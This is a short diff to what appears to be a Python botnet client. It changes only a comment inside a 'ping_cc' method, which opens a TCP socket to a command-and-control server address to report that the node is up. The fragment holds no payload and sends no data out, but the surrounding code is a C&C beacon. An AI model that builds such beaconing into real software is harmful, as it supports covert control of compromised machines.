@@ -28,7 +28,7 @@ class Node:
     # Tell C&C that this node are up or check for the C&C itself.
     def ping_cc(self):
         try:
-            # Ping with a disposable socket:
+            # Use a disposable socket:
             ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             ping_socket.connect((self.cc_ip, self.cc_port))
             sleep(0.1)
